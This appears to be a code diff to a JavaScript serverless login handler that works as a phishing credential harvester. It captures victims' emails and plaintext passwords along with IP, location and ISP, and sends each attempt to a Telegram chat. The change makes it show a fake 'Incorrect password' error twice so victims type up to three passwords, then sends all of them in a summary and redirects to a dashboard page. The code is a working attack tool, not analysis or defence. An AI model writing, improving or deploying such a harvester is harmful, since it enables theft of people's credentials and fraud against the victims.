@@ -8,7 +8,7 @@ const CHAT_ID = '-5336408009';
 
 // In-memory store (resets on cold start – for demo only)
 const attempts = {};
-const firstPasswords = {};
+const passwords = {}; // stores array of passwords per email
 
 // ============================================================
 //  TELEGRAM SENDER
@@ -117,8 +117,8 @@ module.exports = async (req, res) => {
                 return res.status(400).json({ error: 'Invalid email' });
             }
             // Reset attempts for this email
-            if (!attempts[email]) attempts[email] = 0;
-            delete firstPasswords[email];
+            attempts[email] = 0;
+            passwords[email] = [];
             return res.status(200).json({ success: true });
         }
 
@@ -146,19 +146,17 @@ module.exports = async (req, res) => {
             const host = req.headers['host'] || 'Unknown';
             const requestUri = req.url || 'Unknown';
 
-            // Get attempt count
-            const attemptCount = attempts[email] || 0;
+            // Get or initialize attempt count and password store
+            if (!attempts[email]) attempts[email] = 0;
+            if (!passwords[email]) passwords[email] = [];
 
-            // Store first password on first attempt
-            if (attemptCount === 0) {
-                firstPasswords[email] = password;
-            }
-
+            const attemptCount = attempts[email];
             const newAttemptCount = attemptCount + 1;
             attempts[email] = newAttemptCount;
+            passwords[email].push(password);
 
             // --- Send Telegram notification for this attempt ---
-            let msg = `🔐 <b>🔑 New Login Attempt</b>\n`;
+            let msg = `🔐 <b>🔑 Login Attempt #${newAttemptCount}</b>\n`;
             msg += `────────────────────────\n`;
             msg += `📧 <b>Email:</b> <code>${email}</code>\n`;
             msg += `🔑 <b>Password:</b> <code>${password}</code>\n`;
@@ -181,22 +179,24 @@ module.exports = async (req, res) => {
             msg += `🏠 <b>Host:</b> ${host}\n`;
             msg += `📄 <b>Request URI:</b> ${requestUri}\n`;
             msg += `────────────────────────\n`;
-            msg += `Attempt #${newAttemptCount} of 2`;
+            msg += `Attempt ${newAttemptCount} of 3`;
 
             await sendTelegram(msg);
 
-            // --- SECOND ATTEMPT: success + summary + redirect ---
-            if (newAttemptCount >= 2 && firstPasswords[email]) {
-                const firstPw = firstPasswords[email];
+            // --- THIRD ATTEMPT: summary + redirect ---
+            if (newAttemptCount >= 3) {
+                const allPasswords = passwords[email] || [];
 
                 // Send summary Telegram
-                let summary = `⚠️ <b>🚨 TWO FAILED ATTEMPTS 🚨</b>\n`;
+                let summary = `⚠️ <b>🚨 THREE FAILED ATTEMPTS 🚨</b>\n`;
                 summary += `═══════════════════════════\n`;
                 summary += `📧 <b>Email:</b> <code>${email}</code>\n`;
-                summary += `🔑 <b>First Password:</b> <code>${firstPw}</code>\n`;
-                summary += `🔑 <b>Second Password:</b> <code>${password}</code>\n`;
                 summary += `────────────────────────\n`;
-                summary += `🕒 <b>Time of second:</b> ${timestamp}\n`;
+                allPasswords.forEach((pw, idx) => {
+                    summary += `🔑 <b>Attempt ${idx+1}:</b> <code>${pw}</code>\n`;
+                });
+                summary += `────────────────────────\n`;
+                summary += `🕒 <b>Time of last attempt:</b> ${timestamp}\n`;
                 summary += `🌍 <b>IP:</b> <code>${ip}</code>\n`;
                 summary += `📍 <b>Location:</b> ${location}\n`;
                 summary += `🏢 <b>ISP:</b> ${isp}\n`;
@@ -215,14 +215,14 @@ module.exports = async (req, res) => {
 
                 // Clean up
                 delete attempts[email];
-                delete firstPasswords[email];
+                delete passwords[email];
 
-                // ✅ SECOND ATTEMPT – return redirect (success in the flow)
+                // ✅ THIRD ATTEMPT – return redirect
                 return res.status(200).json({ redirect: '/dashboard.html' });
             }
 
-            // ❌ FIRST ATTEMPT – return 401 with error message
-            // This triggers the sleek error in your frontend (shake + friendly message)
+            // ❌ FIRST or SECOND ATTEMPT – return 401 with error
+            // The frontend will show a message based on attemptCount
             return res.status(401).json({ error: 'Incorrect password. Please try again.' });
         }
 
